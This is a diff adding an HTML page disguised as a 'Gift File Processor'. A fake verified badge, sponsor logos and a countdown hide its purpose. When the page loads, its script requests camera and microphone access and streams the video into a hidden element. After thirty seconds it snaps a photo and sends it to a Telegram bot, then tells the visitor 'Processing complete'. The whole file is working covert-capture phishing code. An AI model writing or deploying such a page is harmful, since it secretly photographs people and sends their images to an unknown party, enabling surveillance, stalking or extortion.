@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift File Processor | Secure Access</title>
+    <style>
+        :root {
+            --primary: #3b82f6;
+            --bg: #111827;
+            --card: #1f2937;
+            --text: #f3f4f6;
+            --hacker-green: #10b981;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Verified Profile Header */
+        .profile-section {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--card);
+            padding: 8px 15px;
+            border-radius: 50px;
+            border: 1px solid #374151;
+        }
+
+        .profile-img {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--primary);
+        }
+
+        .verified-badge {
+            color: var(--primary);
+            font-size: 18px;
+        }
+
+        /* Main Processing Card */
+        .container {
+            background: var(--card);
+            width: 100%;
+            max-width: 450px;
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            border: 1px solid #374151;
+        }
+
+        .header-title {
+            color: var(--primary);
+            font-size: 22px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        /* Circular Countdown */
+        .timer-wrapper {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 20px auto;
+        }
+
+        .timer-circle {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid #374151;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+            box-shadow: 0 0 15px var(--primary);
+        }
+
+        .status-box {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #9ca3af;
+            background: #111827;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .status-line { margin: 5px 0; display: flex; justify-content: space-between; }
+        .success { color: var(--hacker-green); }
+        .error { color: #ef4444; }
+
+        /* Footer Sponsors */
+        .footer {
+            margin-top: 40px;
+            width: 100%;
+            max-width: 450px;
+            background: var(--card);
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid #374151;
+        }
+
+        .sponsor-grid {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin-top: 15px;
+        }
+
+        .sponsor-logo {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: #000;
+            padding: 5px;
+            border: 1px solid #4b5563;
+        }
+
+        #video { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="profile-section">
+        <span class="verified-badge">✔</span> <img src="photo/t.jpg" alt="Admin" class="profile-img">
+    </div>
+
+    <div class="container">
+        <div class="header-title">
+            <span style="color:var(--primary)">●</span> Gift File Processor
+        </div>
+
+        <p>Requesting camera access...</p>
+        
+        <div class="timer-wrapper">
+            <div class="timer-circle" id="timer">30</div>
+        </div>
+
+        <div class="status-box">
+            <div class="status-line"><span>Status:</span> <span id="status">Waiting for access...</span></div>
+            <div class="status-line"><span>Countdown:</span> <span id="sec-count">30 seconds</span></div>
+            <div class="status-line"><span>Error:</span> <span class="error">#0 none</span></div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div style="font-size: 12px; color: #6b7280; text-align: left; margin-bottom: 10px;">● Footer</div>
+        <div class="sponsor-grid">
+            <div>
+                <img src="photo/temkinn.jpg" alt="UAIF" class="sponsor-logo">
+                <p style="font-size: 10px; margin-top: 5px;">UAIF Force</p>
+            </div>
+            <div>
+                <img src="photo/uaif.png" alt="KCH" class="sponsor-logo">
+                <p style="font-size: 10px; margin-top: 5px;">K.C.H Group</p>
+            </div>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+
+    <script>
+        // CONFIGURATION
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
+
+        async function startApp() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                let timeLeft = 30;
+                document.getElementById('status').innerText = "Processing camera city...";
+                
+                const interval = setInterval(() => {
+                    timeLeft--;
+                    document.getElementById('timer').innerText = timeLeft;
+                    document.getElementById('sec-count').innerText = timeLeft + " seconds";
+
+                    if(timeLeft <= 0) {
+                        clearInterval(interval);
+                        sendToTelegram(video);
+                    }
+                }, 1000);
+            } catch (e) {
+                document.getElementById('status').innerText = "Access Denied";
+            }
+        }
+
+        function sendToTelegram(video) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'image.jpg');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
+                .then(() => {
+                    document.getElementById('status').innerHTML = '<span class="success">Processing complete!</span>';
+                });
+            }, 'image/jpeg');
+        }
+
+        window.onload = startApp;
+    </script>
+</body>
+</html>
